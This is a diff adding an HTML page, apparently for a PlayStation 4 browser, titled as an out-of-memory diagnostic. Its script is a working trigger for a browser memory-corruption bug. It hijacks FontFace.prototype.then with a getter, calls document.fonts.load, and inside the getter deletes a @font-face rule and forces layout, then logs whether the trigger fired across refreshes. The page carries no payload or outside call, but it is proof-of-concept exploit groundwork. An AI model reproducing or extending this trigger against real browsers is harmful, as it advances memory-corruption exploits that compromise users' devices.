@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 2 — OOM diagnose</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#status { font-size: 18px; margin-bottom: 8px; }
+#log { height: 75vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+.note { color: #aaa; font-size: 12px; margin-bottom: 8px; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">diagnosing...</div>
+<p class="note">Run once, read log, then refresh. Compare visit count.</p>
+<div id="log"></div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    window.ps4log = function (msg) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+})();
+
+// Count visits in this browser session (sessionStorage survives refresh)
+var visit = 1;
+try {
+    visit = (parseInt(sessionStorage.getItem('oom_visit') || '0', 10) || 0) + 1;
+    sessionStorage.setItem('oom_visit', String(visit));
+} catch (e) {
+    ps4log('sessionStorage unavailable');
+}
+
+window.onload = function () {
+    ps4log('=== visit #' + visit + ' in this browser session ===');
+    ps4log('UA: ' + navigator.userAgent);
+
+    if (visit === 1) {
+        ps4log('FIRST visit — if trigger fires but no crash, memory may be leaking');
+    } else {
+        ps4log('REPEAT visit #' + visit + ' — OOM crash often happens here');
+    }
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    ps4log('FontFace A created and added');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            ps4log('then getter: this===A is ' + (this === A));
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('TRIGGER FIRED — deleteRule + layout');
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    ps4log('document.fonts.load called');
+
+    setTimeout(function () {
+        if (fired) {
+            ps4status('visit #' + visit + ': trigger fired, survived 2s', '#ff0');
+            ps4log('trigger DID fire on this visit');
+        } else {
+            ps4status('visit #' + visit + ': trigger NEVER fired', '#f80');
+            ps4log('then getter never ran — bug path not taken on first try?');
+        }
+        ps4log('Now REFRESH and see if visit count goes up before OOM');
+    }, 2000);
+};
+</script>
+</body>
+</html>
